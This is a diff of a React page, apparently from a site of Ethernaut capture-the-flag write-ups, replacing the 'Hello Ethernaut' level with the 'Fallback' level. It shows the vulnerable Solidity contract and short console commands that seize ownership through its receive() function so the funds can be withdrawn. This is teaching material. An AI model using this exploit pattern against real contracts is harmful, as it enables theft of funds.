@@ -4,98 +4,59 @@ import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
 import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
 import TextDiv from "../../components/TextDiv";
 
-const HelloEthernaut = () => {
+const Fallback = () => {
   const [copy, setCopy] = useState(false);
   const codeString = `
-  // SPDX-License-Identifier: MIT
-  pragma solidity ^0.8.0;
-  
-  contract Instance {
-  
-    string public password;
-    uint8 public infoNum = 42;
-    string public theMethodName = 'The method name is method7123949.';
-    bool private cleared = false;
-  
-    // constructor
-    constructor(string memory _password) {
-      password = _password;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Fallback {
+    mapping(address => uint) public contributions;
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+        contributions[msg.sender] = 1000 * (1 ether);
     }
-  
-    function info() public pure returns (string memory) {
-      return 'You will find what you need in info1().';
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
     }
-  
-    function info1() public pure returns (string memory) {
-      return 'Try info2(), but with "hello" as a parameter.';
+
+    function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+        if (contributions[msg.sender] > contributions[owner]) {
+            owner = msg.sender;
+        }
     }
-  
-    function info2(string memory param) public pure returns (string memory) {
-      if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
-        return 'The property infoNum holds the number of the next info method to call.';
-      }
-      return 'Wrong parameter.';
+
+    function getContribution() public view returns (uint) {
+        return contributions[msg.sender];
     }
-  
-    function info42() public pure returns (string memory) {
-      return 'theMethodName is the name of the next method.';
+
+    function withdraw() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
     }
-  
-    function method7123949() public pure returns (string memory) {
-      return 'If you know the password, submit it to authenticate().';
+
+    receive() external payable {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
     }
-  
-    function authenticate(string memory passkey) public {
-      if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
-        cleared = true;
-      }
-    }
-  
-    function getCleared() public view returns (bool) {
-      return cleared;
-    }
-  }`;
+}`;
 
   const solutionCode = `
-  await contract.info()
+// Contribute and send eth less then 0.001 eth.
+await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
 
-  // Output: 'You will find what you need in info1().'
-
-  await contract.info1()
-
-  // Output: 'Try info2(), but with "hello" as a parameter.'
-
-  await contract.info2("hello")
-
-  // Output: 'The property infoNum holds the number of the next info method to call.'
-
-  await contract.infoNum().then(v => v.toString())
-
-  // Output: 42
-
-  await contract.info42()
-
-  // Output: 'theMethodName is the name of the next method.'
-
-  await contract.theMethodName()
-
-  // Output: 'The method name is method7123949.'
-
-  await contract.method7123949()
-
-  // Output: 'If you know the password, submit it to authenticate().'
-
-  await contract.password()
-
-  // Output: 'ethernaut0'
-
-  await contract.authenticate('ethernaut0')
-  // Very easy level
+// Call receive function and get ownership.
+await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
 `;
 
   return (
     <div>
-      <h1 className="headerText">Hello Ethernaut</h1>
+      <h1 className="headerText">Fallback</h1>
       <div className="content">
         <div className="highlighterHeader">
           <p className="smallText"> Example code</p>
@@ -139,7 +100,8 @@ const HelloEthernaut = () => {
       <div className="textBox">
         <TextDiv
           title="Hack"
-          text="For start this project we just need to open console and write commans below."
+          text="The player address, need to become owner of the contract & withdraw all amount from contract. If the user has 1000 ether can get ownership. Another solution send ether to contract, because of contract has receive function, we can call it (sent eth without data). For that we need to have a non-zero contribution from us (i.e. player).
+          Then, we send the contract a non-zero eth amount. Below is the solution."
         />
       </div>
       <SyntaxHighlighter
@@ -157,4 +119,4 @@ const HelloEthernaut = () => {
   );
 };
 
-export default HelloEthernaut;
+export default Fallback;
